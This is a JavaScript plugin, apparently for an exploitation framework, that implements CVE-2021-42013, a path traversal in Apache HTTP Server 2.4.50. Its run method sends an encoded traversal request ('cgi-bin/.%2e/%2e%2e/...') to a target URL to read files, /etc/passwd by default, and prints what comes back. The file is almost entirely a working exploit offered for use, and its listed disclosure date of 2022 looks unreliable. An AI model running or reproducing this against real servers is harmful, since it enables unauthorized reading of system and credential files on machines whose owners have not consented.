// Main
class Plugin {
    constructor(log, info, dependencies){
        this.log = log
        this.platforms = info.platforms
        this.arch = info.arch
        this.fullInfo = info.fullInfo
        this.dependencies = dependencies
    }

    info(){
        return {
            name: "CVE-2021-42013",
            description: "Apache HTTP Server 2.4.50 path traversal.",
            authors: [
                "I2rys"
            ],
            references: [
                "https://nvd.nist.gov/vuln/detail/CVE-2021-42013"
            ],
            platforms: [
                this.platforms.win
            ],
            arch: this.arch.both,
            options: [
                {
                    name: "url",
                    description: "A vulnerable website url.",
                    required: true
                },
                {
                    name: "path",
                    description: "Path to traverse.",
                    default: "/etc/passwd",
                    required: true
                }
            ],
            disclosureDate: "2022-10-07"
        }
    }

    run(args){
        const request = this.dependencies.request
        const log = this.log

        return new Promise(async(resolve)=>{
            try{
                var response = await request(`${args.url}cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e${args.path}`)
                response = response.body
                
                console.log(`Response:\n\n${response}`)
            }catch{
                log("w", "Website is not vulnerable to CVE-2021-42013")
            }

            resolve()
        })
    }
}

module.exports = Plugin